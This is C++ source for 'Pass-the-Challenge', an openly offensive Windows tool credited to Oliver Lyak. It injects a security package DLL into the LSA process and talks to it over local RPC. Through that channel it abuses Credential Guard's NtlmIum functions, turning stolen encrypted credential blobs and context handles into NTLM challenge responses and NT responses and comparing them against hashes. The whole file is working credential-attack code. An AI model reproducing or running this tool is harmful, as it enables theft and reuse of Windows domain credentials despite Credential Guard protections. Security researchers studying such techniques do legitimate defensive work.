#define SECURITY_WIN32

#include <Windows.h>
#include <sspi.h>
#include <iostream>

#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "rpcrt4.lib")

#include "Protocol_h.h"
#include "Menu.h"
#include "Utils.h"
#include "Constants.h"

BOOL Connect() {
    RPC_WSTR szStringBinding = NULL;
    RPC_STATUS status;

    status = RpcStringBindingCompose(
        NULL,
        (RPC_WSTR)L"ncalrpc",
        NULL,
        (RPC_WSTR)L"PtC",
        NULL,
        &szStringBinding);

    if (status != RPC_S_OK) {
        printf("[-] RpcStringBindingCompose failed: %#lx", status);
        return FALSE;
    }

    status = RpcBindingFromStringBinding(
        szStringBinding,
        &hBinding);

    if (status != RPC_S_OK) {
        printf("[-] RpcBindingFromStringBinding failed: %#lx", status);
        return FALSE;
    }

    return status == RPC_S_OK;
}

int Ping(int tries) {
    if (Connect() == FALSE)
        return -1;

    int alive = 0;
    for (int i = 0; i < tries; i++) {
        RpcTryExcept;
        {
            alive = Ping();
            break;
        }
        RpcExcept(1);
        {
            if (RpcExceptionCode() == RPC_S_SERVER_UNAVAILABLE) {
                printf("[!] Server unavailable. Try: %d/%d\n", i + 1, tries);
                if (i + 1 != tries)
                    Sleep(1000);
            }
            else {
                printf("[-] Runtime error: %x\n", RpcExceptionCode());
                return -1;
            }
        }
        RpcEndExcept;
    }

    if (alive == 1) {
        printf("[+] Server is alive\n");
        return 0;
    }

    printf("[-] Server unavailable. Giving up\n");
    return -1;
}

int Ping(int, LPCCH*) {
    return Ping(10);
}

int Inject(int argc, LPCCH* argv) {
    LPCCH filename = "SecurityPackage.dll";
    CHAR fullFilename[MAX_PATH] = { 0 };

    if (argc == 1)
        filename = argv[0];

    SECURITY_PACKAGE_OPTIONS options;
    memset(&options, 0, sizeof(options));

    if (GetFullPathNameA(
        filename,
        MAX_PATH,
        fullFilename,
        NULL
    ) == 0) {
        printf("[-] Failed to get full path of module: %s\n", filename);
        return -1;
    }

    if (AddSecurityPackageA(fullFilename, &options) != 0) {
        printf("[-] Package does not seem to be loaded");
    }
    else {
        printf("[+] Package seems to be loaded");
    }

    return 0;
}

int Challenge(int argc, LPCCH* argv) {
    if (Ping(1) != 0) {
        printf("[-] Server did not reply");
        return -1;
    }
    if (argc != 3) {
        printf("[-] Missing one or more parameters\n");
        return -2;
    }

    DWORD64 contextHandle = 0;
    DWORD64 proxyInfo = 0;
    BYTE* encryptedBlob = NULL;
    
    if (sscanf_s(argv[0], "%llx:%llx", &contextHandle, &proxyInfo) != 2) {
        printf("[-] Unknown format for addresses. Expected: <hex>:<hex>\n");
        return -2;
    }

    DWORD encryptedSize = lstrlenA(argv[1]) / 2;
    if ((encryptedBlob = HexDecode((LPSTR)argv[1])) == NULL) {
        printf("[-] Failed to hex decode encrypted blob. Expected: <hex>\n");
        return -2;
    }

    WCHAR* UserName = NULL;
    WCHAR* LogonDomainName = NULL;
    WCHAR* ServerName = NULL;
    BYTE* ChallengeToClient = NULL;
    BYTE UserSessionKey[MSV1_0_USER_SESSION_KEY_LENGTH];
    USHORT Ntlm3ResponseLength = 0;
    BYTE* Ntlm3Response = NULL;

    if (DecodeChallenge(argv[2], (BYTE **)&LogonDomainName, (BYTE**)&UserName, (BYTE**)&ServerName, &ChallengeToClient) == FALSE) {
        printf("[-] Failed to decode challenge. Expected: <UTF16_HEX domain>:<UTF16_HEX username>:<HEX server name>:<HEX server challenge>\n");
        return -2;
    }

    int res = 0;
    RpcTryExcept;
    {
        res = NtlmIumLm20GetNtlm3ChallengeResponse(contextHandle, proxyInfo, UserName, LogonDomainName, ServerName, ChallengeToClient, (USHORT)encryptedSize, encryptedBlob, UserSessionKey, &Ntlm3ResponseLength, &Ntlm3Response);
    }
    RpcExcept(1);
    {
        printf("[-] Runtime error: %x\n", RpcExceptionCode());
        return -1;
    }
    RpcEndExcept;
    
    if (res == 0) {
        printf("[+] Response:\n\n");
        for (int i = 0; i < 16; i++) {
            printf("%02x", UserSessionKey[i]);
        }
        printf(":");
        for (int i = 0; i < Ntlm3ResponseLength; i++) {
            printf("%02x", Ntlm3Response[i]);
        }
        printf("\n\n");
    }
    else {
        printf("[-] Call failed: %#lx\n", res);
    }

    return 0;
}

int NtHash(int argc, LPCCH* argv)
{
    if (argc < 0) {
        printf("[-] Missing one or more parameters\n");
        return -2;
    }

    DWORD64 contextHandle = 0;
    DWORD64 proxyInfo = 0;
    BYTE* encryptedBlob = NULL;
    BYTE* ChallengeToClient = NULL;
    BYTE StaticChallenge[] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88};

    if (sscanf_s(argv[0], "%llx:%llx", &contextHandle, &proxyInfo) != 2) {
        printf("[-] Unknown format for addresses. Expected: <hex>:<hex>\n");
        return -2;
    }

    DWORD encryptedSize = lstrlenA(argv[1]) / 2;
    if ((encryptedBlob = HexDecode((LPSTR)argv[1])) == NULL) {
        printf("[-] Failed to hex decode encrypted blob. Expected: <hex>\n");
        return -2;
    }
    

    if (argc > 2) {
        DWORD challengeSize = lstrlenA(argv[2]) / 2;

        if (challengeSize != 8) {
            printf("[-] Invalid challenge size: %d\n", challengeSize);
            return -2;
        }

        if ((ChallengeToClient = HexDecode((LPSTR)argv[2])) == NULL) {
            printf("[-] Failed to hex decode encrypted blob. Expected: <hex>\n");
            return -2;
        }
    }
    else {
        ChallengeToClient = StaticChallenge;
    }
    

    if (Ping(1) != 0) {
        printf("[-] Server did not reply");
        return -1;
    }

    BYTE Response[24];
    int res = 0;
    RpcTryExcept;
    {
        res = NtlmIumCalculateNtResponse(contextHandle, proxyInfo, ChallengeToClient, (USHORT)encryptedSize, encryptedBlob, Response);
    }
    RpcExcept(1);
    {
        printf("[-] Runtime error: %x\n", RpcExceptionCode());
        return -1;
    }
    RpcEndExcept;

    if (res == 0) {
        printf("[+] Response:\n\n");
        printf("NTHASH:");
        for (int i = 0; i < 24; i++) {
            printf("%02X", Response[i]);
        }
        printf("\n\n");
    }
    else {
        printf("[-] Call failed: %#lx\n", res);
    }

    return 0;
}


int Protect(int argc, LPCCH* argv) {
    if (argc != 2) {
        printf("[-] Missing one or more parameters\n");
        return -2;
    }

    DWORD64 contextHandle = 0;
    DWORD64 proxyInfo = 0;
    BYTE* nthash = NULL;

    if (sscanf_s(argv[0], "%llx:%llx", &contextHandle, &proxyInfo) != 2) {
        printf("[-] Unknown format for addresses. Expected: <hex>:<hex>\n");
        return -2;
    }

    DWORD nthashSize = lstrlenA(argv[1]) / 2;

    if (nthashSize != MSV1_0_NT_OWF_PASSWORD_LENGTH) {
        printf("[-] Invalid hash size: %d\n", nthashSize);
        return -2;
    }

    if ((nthash = HexDecode((LPSTR)argv[1])) == NULL) {
        printf("[-] Failed to hex decode encrypted blob. Expected: <hex>\n");
        return -2;
    }

    if (Ping(1) != 0) {
        printf("[-] Server did not reply");
        return -1;
    }

    BYTE *encryptedBlob = NULL;
    USHORT encryptedSize = 0;

    int res = 0;
    RpcTryExcept;
    {
        res = NtlmIumProtectCredential(contextHandle, proxyInfo, nthash, &encryptedSize, &encryptedBlob);
    }
    RpcExcept(1);
    {
        printf("[-] Runtime error: %x\n", RpcExceptionCode());
        return -1;
    }
    RpcEndExcept;

    if (res == 0 && encryptedSize != 0 && encryptedBlob != NULL) {
        printf("[+] Encrypted blob:\n\n");
        for (int i = 0; i < encryptedSize; i++) {
            printf("%02X", encryptedBlob[i]);
        }
        printf("\n\n");
    }
    else {
        printf("[-] Call failed: %#lx, encryptedSize=%d, encryptedBlob=%p\n", res, encryptedSize, encryptedBlob);
    }

    return 0;
}

int Compare(int argc, LPCCH* argv) {
    if (argc != 3) {
        printf("[-] Missing one or more parameters\n");
        return -2;
    }

    DWORD64 contextHandle = 0;
    DWORD64 proxyInfo = 0;
    BYTE* encryptedBlob1 = NULL;
    BYTE* encryptedBlob2 = NULL;
    BOOL IsEncrypted = FALSE;

    if (sscanf_s(argv[0], "%llx:%llx", &contextHandle, &proxyInfo) != 2) {
        printf("[-] Unknown format for addresses. Expected: <hex>:<hex>\n");
        return -2;
    }

    DWORD encryptedSize1 = lstrlenA(argv[1]) / 2;
    if ((encryptedBlob1 = HexDecode((LPSTR)argv[1])) == NULL) {
        printf("[-] Failed to hex decode encrypted blob. Expected: <hex>\n");
        return -2;
    }

    DWORD encryptedSize2 = lstrlenA(argv[2]) / 2;
    if ((encryptedBlob2 = HexDecode((LPSTR)argv[2])) == NULL) {
        printf("[-] Failed to hex decode encrypted blob. Expected: <hex>\n");
        return -2;
    }
    if (encryptedSize2 != MSV1_0_NT_OWF_PASSWORD_LENGTH) {
        IsEncrypted = TRUE;
        printf("[*] Comparing with encrypted blob\n");
    }
    else {
        printf("[*] Comparing with NTLM hash\n");
    }
    BOOL Matches = FALSE;
    
    if (Ping(1) != 0) {
        printf("[-] Server did not reply");
        return -1;
    }

    int res = 0;
    RpcTryExcept;
    {
        res = NtlmIumCompareCredentials(contextHandle, proxyInfo, (USHORT)encryptedSize1, encryptedBlob1, IsEncrypted, (USHORT)encryptedSize2, encryptedBlob2, &Matches);
    }
    RpcExcept(1);
    {
        printf("[-] Runtime error: %x\n", RpcExceptionCode());
        return -1;
    }
    RpcEndExcept;

    if (res != 0) {
        printf("[-] Failed to compare credentials: %#lx\n", res);
        return -1;
    }

    if (Matches == TRUE) {
        printf("[+] Matches\n");
    }
    else {
        printf("[-] Doesn't match\n");
    }

    return 0;
}

int main(int argc, LPCCH *argv)
{
    int status = 0;
    
    puts("Pass-the-Challenge (PtC) - by Oliver Lyak (ly4k)\n");
    
    if (argc == 1) {
        PrintMenu();
        return -1;
    }

    for (int i = 0; ; i++) {
        if (COMMANDS[i].name == NULL) {
            PrintMenu();
            return -1;
        }
        if (lstrcmpiA(argv[1], COMMANDS[i].name) == 0) {
            status = COMMANDS[i].func(argc - 2, &argv[2]);
            if (status == -2) {
                PrintMenu();
            }
            return status;
        }
    }

    return 0;
}

void* __RPC_USER midl_user_allocate(size_t size)
{
    return malloc(size);
}

// Memory deallocation function for RPC.
void __RPC_USER midl_user_free(void* p)
{
    free(p);
}